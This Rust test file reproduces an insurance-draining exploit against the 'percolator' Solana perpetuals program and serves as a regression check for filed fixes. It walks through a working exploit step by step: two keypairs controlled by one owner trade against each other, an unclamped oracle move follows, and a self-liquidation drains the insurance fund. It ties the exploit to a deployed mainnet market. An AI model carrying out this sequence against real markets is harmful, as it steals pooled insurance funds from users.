//! F7 — Insurance teleport via residual inflation in self-trade liquidation.
//!
//! Filed at aeyakovenko/percolator-prog#39. This test reproduces the drain
//! end-to-end in LiteSVM: a single entity controlling two distinct keypairs
//! opens opposing positions, waits for an oracle move past IM, liquidates
//! the losing leg (insurance absorbs the loss), then collects the matured
//! PnL on the winning leg. Net extraction ≈ insurance absorbed.
//!
//! Mainnet-vulnerable config replicated: `oracle_price_cap_e2bps = 0`
//! (matches deployed market `5ZamU…kTqB`; `clamp_oracle_price` at
//! percolator/src/percolator.rs:2778-2787 short-circuits → raw Pyth
//! passes through unclamped).
//!
//! ## Pass/fail semantics
//!
//! The hard assertion at the bottom is written in the existing
//! "ATTACK: …" convention used throughout `test_security.rs`: it asserts
//! that the attacker's net gain across both controlled accounts is
//! non-positive. With the unpatched engine, this assertion FAILS — that
//! failure IS the proof of the F7 drain. With either fix landed
//! (PR #39 vault-debit OR aeyakovenko/percolator#49 counterparty-stamp),
//! the assertion PASSES, providing regression coverage.

mod common;
use common::*;

#[test]
fn test_f7_self_trade_drains_insurance() {
    program_path();

    let mut env = TestEnv::new();
    // cap = 0 reproduces the deployed mainnet market `5ZamU…kTqB`.
    // permissionless_resolve_stale_slots large enough that resolved-mode
    // doesn't fire and we stay in the live-mode payout path
    // (`finalize_touched_accounts_post_live`, percolator/src/percolator.rs:3567-3576).
    env.init_market_with_cap(0, 0, 1_000_000);

    // Insurance seed — F7's worked example uses 5 SOL.
    let admin = Keypair::from_bytes(&env.payer.to_bytes()).unwrap();
    env.top_up_insurance(&admin, 5_000_000_000);

    // TWO DISTINCT KEYPAIRS controlled by one economic entity. This is
    // the "two-key cartel" pattern abishekk92 documented at
    // aeyakovenko/percolator-prog#43. Wrapper-level same-owner checks
    // (PR #37, PR #41 's `owners_distinct_ok`) do not catch this — they
    // only reject `lhs == rhs` keypair equality.
    let attacker_a = Keypair::new();
    let a_idx = env.init_user(&attacker_a);
    env.deposit(&attacker_a, a_idx, 5_000_000_000); // 5 SOL capital

    let attacker_b = Keypair::new();
    let b_idx = env.init_lp(&attacker_b);
    env.deposit(&attacker_b, b_idx, 5_000_000_000); // 5 SOL capital

    let insurance_before = env.read_insurance_balance();
    let vault_before = env.read_engine_vault();
    let a_capital_before = env.read_account_capital(a_idx);
    let b_capital_before = env.read_account_capital(b_idx);

    // === Step 1: Open opposing positions at the default oracle price.
    //
    // Positive size convention: A goes long, B (LP) takes the short side.
    // Both post IM (default initial_margin_bps = 2000 → 20%).
    env.try_trade(&attacker_a, &attacker_b, b_idx, a_idx, 100_000_000)
        .expect("F7 step 1: opposing-position open should succeed");

    // === Step 2: Move Pyth oracle far past IM. Default test price is
    // ~$138/SOL; dropping to $10 is a >90% downside move, well past the
    // 20% IM threshold. With `cap = 0` this move lands unclamped in one
    // crank (`clamp_oracle_price` short-circuits when max_change == 0,
    // so `clamp_external_price` at percolator/src/percolator.rs:2842-2858
    // writes raw Pyth into `last_effective_price_e6`).
    //
    // A (long) is now deeply underwater; B (short) holds the matching
    // positive PnL.
    env.set_slot_and_price(3_000, 10_000_000);
    env.crank();

    // === Step 3: Liquidate A — the losing leg. `LiquidateAtOracle` is
    // permissionless. The bankruptcy shortfall (loss > A's deposited
    // capital) is absorbed by `use_insurance_buffer` at
    // percolator/src/percolator.rs:2291-2301 — insurance balance
    // shrinks; engine `vault` is NOT debited. This is the asymmetric
    // mutation at the core of F7.
    let _ = env.try_liquidate_target(a_idx);

    // === Step 4: Touch B to commit B's matured PnL against the now-
    // inflated residual. Any path that calls
    // `accrue_market + touch_account_live_local` works — a second
    // `TradeNoCpi` is the most direct.
    let _ = env.try_trade(&attacker_a, &attacker_b, b_idx, a_idx, -100_000_000);

    env.set_slot(10_000);
    env.crank();

    let insurance_after = env.read_insurance_balance();
    let vault_after = env.read_engine_vault();
    let a_capital_after = env.read_account_capital(a_idx);
    let b_capital_after = env.read_account_capital(b_idx);

    // === Diagnostic trace — useful when iterating on assertion tuning.
    let insurance_drop = insurance_before as i128 - insurance_after as i128;
    let vault_drop = vault_before as i128 - vault_after as i128;
    let attacker_total_before = a_capital_before as i128 + b_capital_before as i128;
    let attacker_total_after = a_capital_after as i128 + b_capital_after as i128;
    let attacker_gain = attacker_total_after - attacker_total_before;

    println!(
        "F7 PoC trace:\n  \
         insurance: {} → {} (Δ -{})\n  \
         engine vault: {} → {} (Δ -{})\n  \
         A capital: {} → {}\n  \
         B capital: {} → {}\n  \
         attacker total: {} → {} (Δ {})\n  \
         insurance teleported into attacker hands: {}",
        insurance_before, insurance_after, insurance_drop,
        vault_before, vault_after, vault_drop,
        a_capital_before, a_capital_after,
        b_capital_before, b_capital_after,
        attacker_total_before, attacker_total_after, attacker_gain,
        if vault_drop == 0 && insurance_drop > 0 { "YES (asymmetric mutation)" } else { "no" },
    );

    // === Sanity: insurance must have been touched (otherwise the
    // bankruptcy didn't trigger absorption — likely a setup issue).
    assert!(
        insurance_after < insurance_before,
        "F7 setup precondition: insurance must shrink (use_insurance_buffer \
         must fire). before={} after={}. If this fails, the oracle move or \
         position size needs tuning.",
        insurance_before, insurance_after,
    );

    // === HARD ASSERTION (matches existing "ATTACK: ..." convention in
    // test_security.rs).
    //
    // PRE-FIX: this assertion FAILS — `attacker_gain > 0` proves the F7
    // drain works (the "human smarter than a machine" finding @toly
    // tweeted on 2026-04-23).
    //
    // POST-FIX (either PR #39 vault-debit OR aeyakovenko/percolator#49
    // counterparty-stamp landed): this assertion PASSES — attacker net
    // gain is non-positive, drain blocked, regression coverage in place.
    assert!(
        attacker_gain <= 0,
        "ATTACK F7: self-trade liquidation produced positive net extraction \
         for the attacker entity. attacker_gain={} insurance_drop={} \
         vault_drop={}. This is the F7 insurance-teleport drain — \
         see PR #39 and aeyakovenko/percolator#49 for fix discussion.",
        attacker_gain, insurance_drop, vault_drop,
    );
}
